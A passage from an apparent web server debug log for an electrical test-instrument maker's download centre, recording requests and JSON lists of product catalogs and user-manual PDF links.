"id":319,"name":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf"},{"id":320,"name":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":320,"name":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf"},{"id":326,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":327,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":328,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":329,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":330,"name":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf"},{"id":331,"name":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf"},{"id":332,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf"},{"id":333,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf"},{"id":337,"name":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":337,"name":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":337,"name":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"name":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":338,"name":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"name":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T14:21:11+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=1&name=%E4%BA%A7%E5%93%81%E5%9E%8B%E5%BD%95
[ download ] 1
---------------------------------------------------------------
[ 2026-03-18T14:21:11+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=1&name=%E4%BA%A7%E5%93%81%E5%9E%8B%E5%BD%95
[ download ] [{"id":242,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":244,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":260,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":262,"title":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"title":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":264,"title":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":268,"title":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":270,"title":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf","agreement":"","drive":"","resource":""},{"id":271,"title":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf","agreement":"","drive":"","resource":""},{"id":272,"title":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf","agreement":"","drive":"","resource":""},{"id":290,"title":"\u4ea4\u6d41\u6052\u6d41\u6e90","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":291,"title":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"title":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":298,"title":"\u533b\u7528\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eea","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":299,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66763U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":300,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":303,"title":"\u5b89\u89c4\u7efc\u5408\u6821\u51c6\u70b9\u68c0\u5de5\u88c5","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":304,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea5KV\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":306,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":307,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":308,"title":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":309,"title":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":311,"title":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":312,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":314,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":315,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf","agreement":"","drive":"","resource":""},{"id":316,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":317,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":318,"title":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf","agreement":"","drive":"","resource":""},{"id":320,"title":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf","agreement":"","drive":"","resource":""},{"id":321,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66764U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":322,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66765U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":323,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667620K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":324,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667640K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":325,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667660K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":326,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":327,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":328,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":329,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":330,"title":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf","agreement":"","drive":"","resource":""},{"id":331,"title":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf","agreement":"","drive":"","resource":""},{"id":332,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf","agreement":"","drive":"","resource":""},{"id":333,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":337,"title":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"title":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T14:21:11+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=1&name=%E4%BA%A7%E5%93%81%E5%9E%8B%E5%BD%95
[ download ] [{"id":242,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":244,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":260,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":262,"name":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":263,"name":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":264,"name":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":268,"name":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":270,"name":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":271,"name":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":272,"name":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":306,"name":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":307,"name":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":308,"name":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":309,"name":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":311,"name":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":312,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":314,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":315,"name":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":316,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":317,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":319,"name":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":320,"name":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":337,"name":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":338,"name":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u4ea7\u54c1\u578b\u5f55","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T14:21:12+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=2&name=%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C
[ download ] 2
---------------------------------------------------------------
[ 2026-03-18T14:21:12+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=2&name=%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C
[ download ] [{"id":242,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":244,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":260,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 